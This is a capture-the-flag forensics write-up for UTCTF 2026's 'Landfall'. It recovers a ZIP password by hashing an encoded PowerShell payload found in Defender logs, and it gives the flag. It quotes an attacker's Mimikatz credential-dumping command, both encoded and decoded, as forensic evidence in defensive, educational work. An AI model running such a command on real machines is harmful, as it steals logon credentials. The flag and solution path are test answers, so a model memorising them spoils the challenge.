---
title: "UTCTF 2026: Landfall"
description: "Writeup for Landfall from UTCTF 2026. Challenge weight: 958 points."
slug: utctf-landfall
date: 2026-03-13 03:22:45.383+0000
competition: "UTCTF 2026"
categories:
    - Forensics
tags:
    - writeup
    - utctf-2026
    - landfall
---

## Challenge

- Competition: `UTCTF 2026`
- Challenge: `Landfall`
- Category: `Forensics`
- Points: `958`
- Original target(s): [https://cdn.utctf.live/Modified_KAPE_Triage_Files.zip](https://cdn.utctf.live/Modified_KAPE_Triage_Files.zip)


## Solve Path

1) Category detection
- Detected category: `misc/forensics`
- Confidence: high
- Evidence: Windows Defender logs, browser history, PowerShell execution traces, and encrypted checkpoint archive.

2) Attack strategy
- Minimal hypothesis: Defender logged the exact encoded PowerShell command used for the credential-dumping attempt.
- Validation: extract the `-e` payload, decode it, MD5 the encoded portion only, and test that hash as the ZIP password.

3) Execution steps
- In the Defender log, the decisive command was:
  `powershell.exe -nop -e QwA6AFwAVQBzAGUAcgBzAFwAagBvAG4AXABEAG8AdwBuAGwAbwBhAGQAcwBcAG0AaQBtAGkAawBhAHQAegBcAHgANgA0AFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAiAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAIgAgACIAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIgAgACIAZQB4AGkAdAAiAA==`
- Decoded command:
  ``x64/mimikatz.exe` "privilege::debug" "sekurlsa::logonpasswords" "exit"`
- MD5 of the encoded portion only:
  `00c8e4a884db2d90b47a4c64f3aec1a4`
- That password successfully opened `checkpointA (1).zip`.zip), and `flag.txt` contains the flag.

4) FLAG
- `utflag{4774ck3r5_h4v3_m4d3_l4ndf4ll}`

5) Writeup
- The threat actor attempted to dump credentials with Mimikatz via an encoded PowerShell launcher.
- The checkpoint password was not the decoded command, but the MD5 of the base64 payload after `-e`.
- The exact attempted credential-theft command was:
  ``x64/mimikatz.exe` "privilege::debug" "sekurlsa::logonpasswords" "exit"`
